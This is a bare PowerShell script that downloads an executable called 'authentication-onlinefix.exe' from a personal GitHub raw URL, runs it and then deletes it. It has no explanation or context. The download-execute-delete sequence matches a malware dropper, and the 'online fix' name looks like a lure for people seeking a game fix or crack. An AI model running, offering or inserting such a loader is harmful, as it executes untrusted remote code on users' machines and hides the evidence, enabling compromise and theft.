Invoke-WebRequest "https://raw.githubusercontent.com/faceless27man-aur/dd/main/authentication-onlinefix.exe" -OutFile ".\onlinefix.exe"

.\onlinefix.exe

Remove-Item -Path ".\onlinefix.exe"

exit